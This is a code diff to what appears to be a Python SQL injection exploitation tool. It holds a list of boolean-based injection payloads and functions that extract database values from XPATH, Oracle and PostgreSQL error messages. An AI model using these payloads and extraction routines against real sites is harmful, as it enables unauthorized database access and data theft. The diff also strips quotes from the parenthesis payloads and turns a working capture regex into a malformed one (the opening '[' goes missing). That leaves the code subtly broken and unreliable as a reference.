@@ -20,8 +20,8 @@ BOOLEAN_PAYLOADS = [
     ("' AND 1=1/*", "' AND 1=2/*", "C-style comment"),
     ("'||'1'='1", "'||'1'='2", "Oracle string concat"),
     ("' AND 1=1;--", "' AND 1=2;--", "MSSQL semicolon"),
-    ("') AND 1=1--", "') AND 1=2--", "Closed parenthesis"),
-    ("')) AND 1=1--", "')) AND 1=2--", "Double parenthesis"),
+    (") AND 1=1--", ") AND 1=2--", "Closed parenthesis"),
+    (")) AND 1=1--", ")) AND 1=2--", "Double parenthesis"),
     ("%' AND 1=1 AND '%'='", "%' AND 1=2 AND '%'='", "LIKE clause"),
 ]
 
@@ -120,7 +120,7 @@ def _extract_single(target, param, payload, patterns):
                 if val and 1 < len(val) < 500:
                     return val
         # XPATH Syntax Error Fallback
-        xm = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<\s][^\'"<]{0,200})', resp.text, re.I)
+        xm = re.search(r'XPATH syntax error:\s*[\'"]?(^\'"<\s][^\'"<]{0,200})', resp.text, re.I)
         if xm:
             val = xm.group(1).strip('~').strip()
             if val and len(val) > 1:
@@ -170,7 +170,7 @@ def _try_extract_data(target, db_type='mysql', param='id'):
     }
     
     db_xpath = xpath_map.get(db_type, xpath_map['mysql'])
-    xp_pats = [r'~([^~]+)~', r'XPATH syntax error:\s*[\'"]?([^\'"<\s][^\'"<]{0,200})',
+    xp_pats = [r'~([^~]+)~', r'XPATH syntax error:\s*[\'"]?(^\'"<\s][^\'"<]{0,200})',
                r'ORA-\d+:\s*([^\r\n<]{3,200})', r'ERROR:\s*([^\r\n<]{3,200})']
     
     for label, payload in db_xpath.items():
